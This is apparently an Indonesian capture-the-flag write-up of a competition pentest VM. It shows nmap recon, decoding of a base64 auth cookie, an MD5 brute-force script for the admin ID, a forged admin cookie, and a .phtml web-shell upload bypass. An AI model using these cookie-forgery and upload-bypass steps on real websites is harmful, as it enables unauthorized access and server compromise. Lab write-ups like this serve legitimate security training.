# Write UP VM Pentest Semi Final Jakarta Hacking Competition.

Berikut ini setting network pada vbox yang diberikan.

![](/JhackVM/images/vbox_net.png)


Berikut tampilan VMnya jika berhasil di import.

![](/JhackVM/images/tampilan1.png)

Dikarenakan kita `Tidak` Diberikan Credential apapun. Maka kita pertama lakukan scanning. Dengan langkah langkah sebagai Berikut.

 - Temukan IP Dari Sever
 - Lakukan Recon pada IP Server

Untuk menemukan IP Asli dari Vboxnya. Kita lakukan `ipconfig` Pada CMD Windows.

![](/JhackVM/images/net.png)

Terlihat disitu IP Dari VBoxnya adalah `192.168.56.1` Tapi itu belum IP Asli dari Server yang kita Import, Maka lakukan scanning dengan `nmap` untuk mendapatkan IP dari Server.

Oke setelah run `nmap` 

```
nmap -sS  192.168.56.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-10 16:04 SE Asia Standard Time
Nmap scan report for 192.168.56.100
Host is up (0.00s latency).
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:E2:1B:E7 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.00056s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
9000/tcp open  http
MAC Address: 08:00:27:65:1C:34 (Oracle VirtualBox virtual NIC)
```

Kita mendapatkan IP asli dari Server adalah. `192.168.56.101` Dan disitu informasi dari IP sudah didapatkan secara minumum. Ada 2 port yang terbuka.

 - 80
 - 9000

Ini adalah preview port 80 

![](/JhackVM/images/web1.png)

Setelah ditelusuri sangat jauh. Ternyata web itu memang hanya template HTML biasa tanpa ada apa apanya. Bisa disebut `Rabbit Hole` Jebakan saja.

Oke Kita buka 9000

![](/JhackVM/images/web2.png)

Seperti itulah tampilanya, Saya sangat tertarik pada page ini. Setelah dicoba coba, Ternyata Loginya tidak bisa dibypass, Maka dilanjutkan dengan register sebuah akun.


![](/JhackVM/images/regis.png)


Oke saya regis dengan credential `Nikko:123`

Lalu saya login dan seperti inilah tampilan web setelah login.

![](/JhackVM/images/home.png)

Saat saya tekan `Flag Here` Ternyata tidak ada apa apa. Lagi lagi `Rabbit Hole` Lalu saya move ke Menu Gallery.

![](/JhackVM/images/g1.png)

![](/JhackVM/images/g2.png)

Seperti itulah tampilan pada Tab Gallery, Disitu terlihat ada sebuah Page Administrator, Tapi saat kami klik kita dikembalikan ke page login.

Saya nyalakan burp untuk mulai melakukan Analisa.

Ada suatu hal yang sangat menarik pada saat kita melakukan request pada `admin.php` 

![](/JhackVM/images/co1.png)


Disitu ada sebuah cookie `auth` yang berisi.

```
eyJpZCI6Ijg1MCIsInVzZXIiOiJOaWtrbyIsInJvbGUiOiJ1c2VyIiwic2lnIjoiVG1scmEyODROVEIxYzJWeSJ9
```

Saat didecode 

```
$ echo -en "eyJpZCI6Ijg1MCIsInVzZXIiOiJOaWtrbyIsInJvbGUiOiJ1c2VyIiwic2lnIjoiVG1scmEyODROVEIxYzJWeSJ9" | base64 -d
{"id":"850","user":"Nikko","role":"user","sig":"Tmlra284NTB1c2Vy"}
```

Setelah di decode base64nya ternyata berbentuk JSON, Pada `sig` terlihat seperti base64 mari decode lagi.

```
$ echo "Tmlra284NTB1c2Vy" | base64 -d
Nikko850user
```

Pada JSON Tersebut bisa dipetakan sebagai berikut.

 - index `id` Berisi id user kita
 - index `user` Berisi username yang kita daftarkan
 - index `role` Set user kita sebagai `user`
 - index `sig` Adalah Base64 dari `user+id+role`


Karena authentikasi pada website ini mengunakan cookie, Maka kita sebenarnya Bebas saya untuk menganti cookie tersebut menjadi cookie login milik orang lain. Namun target kita adalah login sebagai user yang dapat mengakses `admin.php` Dikarenakan kita kekurangan informasi, Kita lanjutkan scanning website dengan port 9000 ini.  

Singkat cerita saya mendapatkan sebuah `robots.txt` Berisi `backup.sql` 

Isi dari backup.sql ini adalah.

```
#For ID use MD5
#For pass sig and role use password_hash 
#Read This admin!

INSERT INTO `user` (`id`, `user`, `pass`, `sig`, `role`) VALUES
('4b6538a44a1dfdc2b83477cd76dee98e', 'Administrator', '$2y$10$4tOngzLdZnNI6SpGJcMLduBSGarzzpLE7/0ayYvIMmHVLXHw.H/gC', '$2y$10$r6aQ.arK6VymipzFBR768u9RT5Pj4Jpmm5EZ2ohDHIcz79FT.bgeS', '$2y$10$Z16BDCKdQLJ/pJY9z.UGSeaW0gjJkGslNGqpxBiGIqsSpSgQGZL36');

COMMIT;
```

Disitu ada sebuah data yang di inputkan. Tapi terlihat hampir semua datanya terenkripsi, Hanya `user` Saja yang tidak yaitu `Administrator` Namun ada hal menarik, ID dari `user` Administrator ini di hash mengunakan MD5. Kita bisa melakukan Bruteforce untuk mengetahui ID Administrator ini. Terlihat pada halaman awal tadi Website ini hanya menyediakan 1000 user, Maka kita hanya perlu membruteforce dari id(1-1001)

Ini script yang saya gunakan.

```
from hashlib import md5

for i in range(1,1001):
	if(md5(str(i)).hexdigest() == "4b6538a44a1dfdc2b83477cd76dee98e"):
		print(i)
		exit(0)
```

Dan saat dijalankan

```
$ python brute.py
945
```

Nah sudah diketahui bahwah `id` Dari Administrator adalah `945` Maka dari itu kita tinggal membuild ulang JSON nya.

```
{"id":"945","user":"Administrator","role":"admin","sig":"QWRtaW5pc3RyYXRvcjk0NWFkbWlu"}
```

role dikarenakan saat registrasi ada radio button `admin` yang disabled maka kita isi dari sini. Dan isi dari `sig` adalah base64 dari `Administrator945admin`

```
$ echo -en  "Administrator945admin" | base64 
QWRtaW5pc3RyYXRvcjk0NWFkbWlu
```

Maka full JSON admin adalah seperti ini

`eyJpZCI6Ijk0NSIsInVzZXIiOiJBZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIiwic2lnIjoiUVdSdGFXNXBjM1J5WVhSdmNqazBOV0ZrYldsdSJ9`

Tinggal kita set pada burp dan ganti cookie authnya.

![](/JhackVM/images/admin.png)


Okay kita sudah masuk as Admin. Disitu ada sebuah form upload. Yang digunakan untuk upload ke Gallery tadi. Setelah bersusah payah bypassnya. Ternyata kita harus mengunkan extensi `phtml` untuk dapat membypass validasinya.


Caranya kita rename dulu shell.php kita menjadi shell.php.jpg agar kita tidak perlu set content typenya dulu.

![](/JhackVM/images/up.png)

Oke shell sudah terupload dan kita tinggal akses ke ip:9000/upload/shell.phtml


![](/JhackVM/images/done.png)

Setelah itu kita tinggal lakukan backconnect dari shell tersebut.

Sekian Write Up untuk kali ini, Untuk privilage escalation akan ditulis oleh <a href = "https://kod0kk.wordpress.com/2018/12/10/writeup-pentest-jhack-2018/">`Reyvand`</a> Pada blog pribadinya. Terima Kasih!
